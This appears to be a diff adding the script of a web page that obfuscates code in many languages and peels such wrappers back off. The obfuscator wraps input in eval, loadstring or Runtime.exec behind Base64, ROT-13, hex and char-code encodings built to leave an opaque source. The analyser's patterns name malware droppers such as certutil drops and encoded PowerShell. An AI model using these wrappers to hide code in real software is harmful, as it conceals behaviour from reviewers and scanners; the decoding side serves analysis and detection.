+ {name:"Double-layer Base64",lvl:4,desc:"Base64 applied twice — atob(atob(...)) at runtime. Two layers of opaque blob.",
+  fn:s=>{const v=rand(6),k=rand(6);
+    return `var ${v}=atob(atob('${b64e(b64e(s))}'));\neval(${v});\n`}}],
+
+php:[
+ {name:"eval(base64_decode)",lvl:2,desc:"Payload Base64'd, decoded and eval'd. Standard PHP obfuscation, works everywhere.",
+  fn:s=>`<?php\neval(base64_decode('${b64e(s)}'));\n`},
+ {name:"ROT-13 + Base64",lvl:3,desc:"Payload Base64'd then ROT-13 shifted. str_rot13 undoes the shift, base64_decode undoes the encoding — both at runtime.",
+  fn:s=>{const e=b64e(s),r=rot13(e);
+    return `<?php\neval(base64_decode(str_rot13('${r}')));\n`}}],
+
+perl:[
+ {name:"eval pack H*",lvl:2,desc:"Payload hex-packed and eval'd. pack('H*') unpacks it at runtime — a Perl classic.",
+  fn:s=>`eval pack("H*","${toHex(s)}");\n`},
+ {name:"MIME::Base64 eval",lvl:2,desc:"Payload Base64'd and decoded with MIME::Base64 (core module since 5.7) before eval.",
+  fn:s=>`use MIME::Base64;\neval decode_base64('${b64e(s)}');\n`}],
+
+java:[
+ {name:"Base64 → Runtime.exec",lvl:2,desc:"Input: a command line to run. The command is Base64'd, decoded at runtime with java.util.Base64 and executed via Runtime.getRuntime().exec. Compiles and runs on Java 8+ with zero dependencies.",
+  fn:s=>{const cls="M"+rnd(100,999);
+    return `class ${cls} {\n  public static void main(String[] a) throws Exception {\n`+
+      `    Runtime.getRuntime().exec(new String(java.util.Base64.getDecoder().decode("${b64e(s)}"), "UTF-8"));\n`+
+      `  }\n}\n`}},
+ {name:"Char-array → Runtime.exec",lvl:3,desc:"Input: a command line to run. The command is flattened into a char[] literal and rebuilt at runtime — no strings, no Base64 alphabet in the source.",
+  fn:s=>{const cls="M"+rnd(100,999);const codes=Array.from(s).map(c=>c.charCodeAt(0));
+    return `class ${cls} {\n  public static void main(String[] a) throws Exception {\n`+
+      `    char[] c = {${codes.join(",")}};\n`+
+      `    Runtime.getRuntime().exec(new String(c));\n`+
+      `  }\n}\n`}}],
+
+ruby:[
+ {name:"eval(Base64.decode64)",lvl:2,desc:"Payload Base64'd and eval'd — decode64 is in Ruby's stdlib, works on any Ruby 1.8+.",
+  fn:s=>`require "base64"\neval(Base64.decode64('${b64e(s)}'))\n`},
+ {name:"eval([code].pack('H*'))",lvl:3,desc:"Payload hex-packed with Array#pack and eval'd — no readable or Base64 content in the file.",
+  fn:s=>`eval([%q{${toHex(s)}}].pack('H*'))\n`}],
+
+lua:[
+ {name:"loadstring + string.char",lvl:2,desc:"Payload rebuilt from numeric char codes via string.char and compiled with loadstring. Works in Lua 5.1 and LuaJIT (Roblox, game scripting, OpenResty).",
+  fn:s=>`loadstring(string.char(${Array.from(s).map(c=>c.charCodeAt(0)).join(",")}))()\n`},
+ {name:"Base64 decoder + loadstring",lvl:3,desc:"Payload Base64'd with a self-contained decode function (Lua has no stdlib base64) and compiled with loadstring. Padding-aware, portable across Lua 5.1+ / LuaJIT.",
+  fn:s=>{const b=b64e(s);
+    return `local A,B='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/',''\n`+
+      `local t={} for i=1,#A do t[A:sub(i,i)]=i-1 end\n`+
+      `local s='${b}'\n`+
+      `for i=1,#s,4 do local n=t[s:sub(i,i)] or 0 n=n*64+(t[s:sub(i+1,i+1)] or 0) n=n*64+(t[s:sub(i+2,i+2)] or 0) n=n*64+(t[s:sub(i+3,i+3)] or 0)\n`+
+      `B=B..string.char(math.floor(n/65536)%256)\n`+
+      `if s:sub(i+2,i+2)~='=' then B=B..string.char(math.floor(n/256)%256) end\n`+
+      `if s:sub(i+3,i+3)~='=' then B=B..string.char(n%256) end end\n`+
+      `loadstring(B)()\n`;}}],
+
+html:[
+ {name:"Base64 → document.write",lvl:2,desc:"The whole page body is Base64'd and re-materialized at runtime via document.write. Source shows only an opaque blob.",
+  fn:s=>{const v=rand(6);
+    return `<!doctype html>\n<script>\ndocument.write(atob('${b64e(s)}'));\n<\/script>\n`}},
+ {name:"Char-code stream",lvl:3,desc:"Body flattened to numeric char codes, rebuilt and written at runtime. No Base64 alphabet in the output.",
+  fn:s=>{const v=rand(6);const codes=u8(s);
+    let out=`<!doctype html>\n<script>\nvar ${v}=[\n`;
+    for(let i=0;i<codes.length;i+=12)out+=codes.slice(i,i+12).join(",")+(i+12<codes.length?",":"")+"\n";
+    out+=`];\ndocument.write(String.fromCharCode.apply(null,${v}));\n<\/script>\n`;
+    return out;}}]
+};
+/* fix js charcode fn (built properly with chunked fromCharCode) */
+METHODS.javascript[1].fn=s=>{const v=rand(6);const codes=u8(s);
+  let expr="";
+  for(let i=0;i<codes.length;i+=600){
+    expr+=`String.fromCharCode(${codes.slice(i,i+600).join(",")})+`;
+  }
+  expr=`${expr.slice(0,-1)}`;
+  return `var ${v}=${expr};\neval(${v});\n`;};
+
+/* ---------- UI ---------- */
+const $=id=>document.getElementById(id);
+let curLang=null,curMethod=null;
+function go(scr){
+  for(const el of document.querySelectorAll("[id^=screen-]"))el.classList.add("hidden");
+  $("screen-"+scr).classList.remove("hidden");
+  window.scrollTo({top:0});
+}
+function showAnalysis(){go("analysis")}
+function pickLang(l){curLang=l;go("method");renderMethods()}
+function renderMethods(){
+  const L=LANGS[curLang];
+  $("p-lang").textContent=L.name.toUpperCase();
+  $("meth-sub").textContent=`${L.name} — ${METHODS[curLang].length} verified methods · output is fully executable`;
+  const box=$("meth-list");box.innerHTML="";
+  METHODS[curLang].forEach((m,i)=>{
+    const b=document.createElement("button");b.className="meth";
+    const dots=[1,2,3,4].map(n=>`<i class="${n<=m.lvl?"f":""}"></i>`).join("");
+    b.innerHTML=`<h4>${m.name}<span class="verified">✓ sandbox-verified</span><span class="dots">${dots}</span></h4><p>${m.desc}</p>`;
+    b.onclick=()=>{curMethod=i;go("work");$("p-lang2").textContent=L.name.toUpperCase();$("p-meth").textContent=m.name.toUpperCase();inSize();};
+    box.appendChild(b);
+  });
+}
+function inSize(){$("in-size").textContent=(new Blob([$("input").value]).size)+" bytes"}
+function loadDemo(){$("input").value=LANGS[curLang].demo;inSize()}
+function runObf(){
+  const src=$("input").value;
+  if(!src.trim()){toast("paste a script or upload a file first");return}
+  try{
+    const out=METHODS[curLang][curMethod].fn(src);
+    $("output").value=out;
+    $("out-size").textContent=(new Blob([src]).size)+" B → "+(new Blob([out]).size)+" B";
+    toast("obfuscated ✓ — output is executable as-is");
+  }catch(e){toast("error: "+e.message)}
+}
+function copyOut(){copyVal($("output").value,"output copied")}
+function copyEl(id){copyVal($(id).value,"copied")}
+function copyVal(t,msg){
+  if(!t){toast("nothing to copy");return}
+  (navigator.clipboard?navigator.clipboard.writeText(t):Promise.reject()).then(()=>toast(msg)).catch(()=>{
+    const ta=document.createElement("textarea");ta.value=t;document.body.appendChild(ta);ta.select();
+    document.execCommand("copy");document.body.removeChild(ta);toast(msg);
+  });
+}
+function downloadOut(){
+  const t=$("output").value;
+  if(!t){toast("nothing to download");return}
+  const ext=LANGS[curLang].ext==="html"?"html":LANGS[curLang].ext;
+  const a=document.createElement("a");
+  a.href=URL.createObjectURL(new Blob([t],{type:"text/plain"}));
+  a.download=`obfuscated.${ext}`;a.click();URL.revokeObjectURL(a.href);
+  toast("downloaded ✓");
+}
+$("file").addEventListener("change",e=>{const f=e.target.files[0];if(f)readFile(f)});
+$("drop").addEventListener("click",()=>$("file").click());
+$("drop").addEventListener("dragover",e=>{e.preventDefault();e.currentTarget.classList.add("over")});
+$("drop").addEventListener("dragleave",e=>e.currentTarget.classList.remove("over"));
+$("drop").addEventListener("drop",e=>{e.preventDefault();e.currentTarget.classList.remove("over");
+  const f=e.dataTransfer.files[0];if(f)readFile(f)});
+function readFile(f){const r=new FileReader();r.onload=()=>{$("input").value=r.result;inSize();toast(f.name+" loaded")};r.readAsText(f)}
+let toastT=null;
+function toast(msg){const t=$("toast");t.textContent=msg;t.classList.add("show");
+  clearTimeout(toastT);toastT=setTimeout(()=>t.classList.remove("show"),2200)}
+
+/* ============================================================
+   ANALYSIS / DEOBFUSCATION ENGINE
+   ============================================================ */
+function printable(s){if(!s)return 0;let n=0;for(const c of s){const x=c.charCodeAt(0);
+  if(x===9||x===10||x===13||(x>=32&&x<127)||x>160)n++;}return n/s.length;}
+function lookLikeB64(s){return /^[\x20-\x7e]{24,}$/.test(s)&&/[A-Za-z0-9+/]{16,}/.test(s)}
+
+function tryDecode(t){
+  let m;
+  /* shell: echo/printf B64 | base64 -d */
+  if(m=t.match(/(?:echo\s+(?:%s\s+)?|printf\s+%s\s+)([A-Za-z0-9+/]{16,}={0,2})\s*\|\s*base64\s+-d/))
+    return{name:"Base64 | base64 -d (shell)",data:b64d(m[1])};
+  /* bash var indirection: V=B64 ... echo $V | base64 -d */
+  if(m=t.match(/(\w+)=([A-Za-z0-9+/]{16,}={0,2})\s*\n[\s\S]*echo\s+\$\1\s*\|\s*base64/))
+    return{name:"Variable-indirection Base64 (shell)",data:b64d(m[2])};
+  /* bash hex printf */
+  if(m=t.match(/printf\s+'((?:\\x[0-9a-fA-F]{2})+)'/)){
+    const hx=m[1].replace(/\\x/g,"");
+    return{name:"Hex printf escapes (shell)",data:fromHex(hx)};
+  }
+  /* python exec b64decode */
+  if(m=t.match(/b64decode\('([A-Za-z0-9+/]{16,}={0,2})'\)/))
+    return{name:"exec(base64.b64decode) (Python)",data:b64d(m[1])};
+  if(m=t.match(/b64decode\(b?'([A-Za-z0-9+/]{16,}={0,2})'/))
+    return{name:"b64decode (Python)",data:b64d(m[1])};
+  /* python hex */
+  if(m=t.match(/bytes\.fromhex\('([0-9a-fA-F]{16,})'\)/))
+    return{name:"bytes.fromhex (Python)",data:fromHex(m[1])};
+  /* python rot13 */
+  if(m=t.match(/codecs'?\)?\.decode\('([^']+)','rot13'\)/))
+    return{name:"ROT-13 (Python codecs)",data:rot13(m[1])};
+  /* powershell FromBase64String with var */
+  if(m=t.match(/\$(\w+)\s*=\s*'([A-Za-z0-9+/]{16,}={0,2})'[\s\S]{0,400}FromBase64String\(\$\1\)/))
+    return{name:"FromBase64String var (PowerShell)",data:b64d(m[2])};
+  if(m=t.match(/FromBase64String\('([A-Za-z0-9+/]{16,}={0,2})'\)/))
+    return{name:"FromBase64String (PowerShell)",data:b64d(m[1])};
+  /* powershell char array */
+  if(m=t.match(/\[(?:Char|Byte)\[\]\]\((\d+(?:,\d+)+)\)/)){
+    return{name:"[Char[]] code array (PowerShell)",data:du8(m[1].split(",").map(Number))};
+  }
+  /* js atob */
+  if(m=t.match(/atob\('([A-Za-z0-9+/]{16,}={0,2})'\)/))
+    return{name:"eval(atob) (JavaScript)",data:b64d(m[1])};
+  /* js fromCharCode (multi-chunk concat) */
+  if(/String\.fromCharCode\(\d/.test(t)&&!/\[\d+(,\d+)/.test(t)){
+    const parts=[...t.matchAll(/String\.fromCharCode\((\d+(?:,\d+)*)\)/g)].map(x=>x[1].split(",").map(Number));
+    if(parts.length&&parts.reduce((a,p)=>a+p.length,0)>8)
+      return{name:"String.fromCharCode (JavaScript)",data:du8(parts.flat())};
+  }
+  /* perl decode_base64 */
+  if(m=t.match(/decode_base64\('([A-Za-z0-9+/]{16,}={0,2})'\)/))
+    return{name:"eval(decode_base64) (Perl)",data:b64d(m[1])};
+  /* perl pack H* */
+  if(m=t.match(/pack\(\s*['"]H\*['"]\s*,\s*"([0-9a-fA-F]{16,})"/))
+    return{name:"eval pack('H*') (Perl)",data:fromHex(m[1])};
+  /* php */
+  if(m=t.match(/str_rot13\(\s*base64_decode\('([A-Za-z0-9+/]{16,}={0,2})'\)/))
+    return{name:"str_rot13(base64_decode) (PHP)",data:rot13(b64d(m[1]))};
+  if(m=t.match(/base64_decode\('([A-Za-z0-9+/]{16,}={0,2})'\)/))
+    return{name:"eval(base64_decode) (PHP)",data:b64d(m[1])};
+  /* php eval rot13 direct */
+  /* php standalone str_rot13 with b64 payload */
+  if(m=t.match(/str_rot13\('([A-Za-z0-9+/]{16,}={0,2})'\)/))
+    return{name:"str_rot13 (PHP)",data:rot13(m[1])};
+  if(m=t.match(/eval\(str_rot13\('([A-Za-z]+)'\)\)/))
+    return{name:"eval(str_rot13) (PHP)",data:rot13(m[1])};
+  /* powershell -enc / lnk EncodedCommand (UTF-16LE base64) */
+  if(m=t.match(/-enc(?:odedcommand)?\s+([A-Za-z0-9+/]{16,}={0,2})/i))
+    return{name:"PowerShell -EncodedCommand (UTF-16LE)",data:du16le(b64dRaw(m[1]))};
+  /* java Base64 → Runtime.exec */
+  if(m=t.match(/Base64\.getDecoder\(\)\.decode\("([A-Za-z0-9+/]{16,}={0,2})"\)/))
+    return{name:"Base64 → Runtime.exec (Java)",data:b64d(m[1])};
+  if(m=t.match(/char\[\]\s*\w*\s*=\s*\{(\d+(?:,\d+){8,})\}/))
+    return{name:"char[] literal (Java)",data:m[1].split(",").map(Number).map(n=>String.fromCharCode(n)).join("")};
+  /* ruby */
+  if(m=t.match(/Base64\.decode64\('([A-Za-z0-9+/]{16,}={0,2})'\)/))
+    return{name:"eval(Base64.decode64) (Ruby)",data:b64d(m[1])};
+  if(m=t.match(/\[%q\{([0-9a-fA-F]{16,})\}\]\.pack\('H\*'\)/))
+    return{name:"eval(pack H*) (Ruby)",data:fromHex(m[1])};
+  /* lua */
+  if(m=t.match(/loadstring\(string\.char\((\d+(?:,\d+)+)\)\)\(\)/))
+    return{name:"loadstring + string.char (Lua)",data:m[1].split(",").map(Number).map(n=>String.fromCharCode(n)).join("")};
+  if(/loadstring\(B\)\(\)/.test(t)&&/string\.char\(math\.floor/.test(t)){
+    const bm=t.match(/local s='([A-Za-z0-9+/]{16,}={0,2})'/);
+    if(bm)return{name:"Base64 decoder + loadstring (Lua)",data:b64d(bm[1])};
+  }
+  /* vba: Shell with Chr() chain */
+  if(m=t.match(/\w+ = ((?:Chr\(\d+\)&?){6,})\nShell \w+/)){
+    const codes=[...m[1].matchAll(/Chr\((\d+)\)/g)].map(x=>+x[1]);
+    return{name:"Chr() chain → Shell (VBA)",data:codes.map(n=>String.fromCharCode(n)).join("")};
+  }
+  if(m=t.match(/\(echo ([A-Za-z0-9+/=]{16,})\)>%TMP%/))
+    return{name:"certutil drop via Shell (VBA)",data:b64d(m[1])};
+  /* vbs chr chain */
+  if(m=t.match(/Execute\s+((?:Chr\(\d+\)&?){6,})/)){
+    const codes=[...m[1].matchAll(/Chr\((\d+)\)/g)].map(x=>+x[1]);
+    return{name:"Execute Chr() chain (VBScript)",data:du8(codes)};
+  }
+  /* vbs xor (AryObscura-style template) */
+  if(/Execute\s+\w+\s*$/.test(t.trim())&&/InStr\(A,/.test(t)){
+    const km=[...t.matchAll(/(\w+)\((\d)\)=(\d+)\n/g)];
+    const dm=t.match(/(\w+)="([A-Za-z0-9+/]{16,}={0,2})"/);
+    if(km.length===8&&dm){
+      const key=km.map(k=>+k[3]);
+      const bytes=b64dRaw(dm[2]).map((b,i)=>b^key[i%8]);
+      return{name:"XOR keystream + Base64 (VBScript)",data:du8(bytes)};
+    }
+  }
+  /* html document.write atob */
+  if(m=t.match(/document\.write\(\s*atob\('([A-Za-z0-9+/]{16,}={0,2})'\)/))
+    return{name:"document.write(atob) (HTML)",data:b64d(m[1])};
+  if(/String\.fromCharCode\.apply/.test(t)){
+    const vm=t.match(/String\.fromCharCode\.apply\(null,\s*(\w+)\)/);
+    if(vm){const arr=t.match(new RegExp(vm[1]+"\\s*=\\s*\\[([\\d\\s,]+)\\]"));
+      if(arr)return{name:"char-code write (HTML/HTA)",data:du8(arr[1].split(",").map(Number))};}
+  }
+  /* batch certutil echo drops */
+  if((m=[...t.matchAll(/\(echo ([A-Za-z0-9+/=]{20,})\)>>?/g)]).length){
+    const b64=m.map(x=>x[1]).join("");
+    return{name:"certutil echo drop (Batch)",data:b64d(b64)};
+  }
+  /* generic: bare base64 blob as entire input */
+  if(lookLikeB64(t)&&/^[A-Za-z0-9+/=\s]+$/.test(t)){
+    const cand=t.replace(/\s+/g,"");
+    const dec=b64d(cand);
+    if(printable(dec)>0.85)return{name:"Raw Base64 blob",data:dec};
+  }
+  return null;
+}
+
+function guessLang(t){
+  if(/^#!.*\b(bash|zsh|sh)\b/m.test(t)||/^\s*(echo|cd|export|if \[|fi$)/m.test(t)&&/\$[A-Za-z_]/.test(t))return"shell";
+  if(/^#!.*python|^\s*(import|from)\s+\w+$|^\s*def\s|print\(/m.test(t))return"python";
+  if(/<\?php/.test(t))return"php";
+  if(/\$[A-Za-z]\w*\s*=|Write-Host|Invoke-Expression|Get-ChildItem/.test(t)&&/[\[{].*::/.test(t))return"powershell";
+  if(/@echo|echo off|%TEMP%|%~d/i.test(t))return"batch";
+  if(/\bDim\b|\bMsgBox\b|WScript\./.test(t))return"vbscript";
+  if(/<!doctype|<html/i.test(t))return"html";
+  if(/\bSub\s+AutoOpen\b|\bDim\s+\w+\s+As\s+/.test(t))return"vba";
+  if(/\bclass\s+\w+\s*\{|public static void main/.test(t))return"java";
+  if(/\bputs\b|\brequire\s+"base64"/.test(t))return"ruby";
+  if(/\bloadstring\b|string\.char\(|local\s+\w+\s*=/.test(t))return"lua";
+  if(/\buse\s+strict\b|print\s+"/.test(t))return"perl";
+  if(/console\.log|function\s|=>|var\s|const\s|let\s/.test(t))return"javascript";
+  return"unknown";
+}
+
+function runAnalysis(){
+  const src=$("a-input").value;
+  if(!src.trim()){toast("paste an obfuscated script first");return}
+  const layers=[];let cur=src,guard=0;
+  while(guard++<8){
+    const r=tryDecode(cur);
+    if(!r)break;
+    layers.push({name:r.name,input:cur,data:r.data});
+    cur=r.data;
+    if(cur.length>2_000_000)break;
+  }
+  $("a-result").classList.remove("hidden");
+  const chain=$("a-chain");chain.innerHTML="";
+  if(!layers.length){
+    chain.innerHTML=`<div class="layer"><div class="lh"><span>no known wrappers detected</span><span class="badge bad">opaque</span></div><div class="lbody" style="color:var(--dim)">Fingerprint didn't match any supported scheme (b64 eval, exec(b64decode), IEX, pack H*, Chr chains, atob, rot13, XOR keystream, certutil drops...). If the payload is encrypted with an external key it can't be recovered from ciphertext alone.</div></div>`;
+    $("a-final").value=src;$("a-info").textContent="";
+    return;
+  }
+  layers.forEach((L,i)=>{
+    const d=document.createElement("div");d.className="layer";
+    const ok=printable(L.data)>0.85;
+    d.innerHTML=`<div class="lh"><span>layer ${i+1} — ${L.name}</span><span class="badge ${ok?"ok":"bad"}">${ok?"decoded":"low printable ratio"}</span></div>`;
+    const body=document.createElement("div");body.className="lbody";
+    body.textContent=L.data.length>1500?L.data.slice(0,1500)+" …":L.data;
+    d.appendChild(body);chain.appendChild(d);
+  });
+  const lang=guessLang(cur);
+  $("a-info").textContent=`${layers.length} layer${layers.length>1?"s":""} peeled · best guess: ${lang} · ${cur.length} bytes`;
+  $("a-final").value=cur;
+  toast(`${layers.length} layer${layers.length>1?"s":""} peeled ✓`);
+}
+</script>
+</body>
+</html>
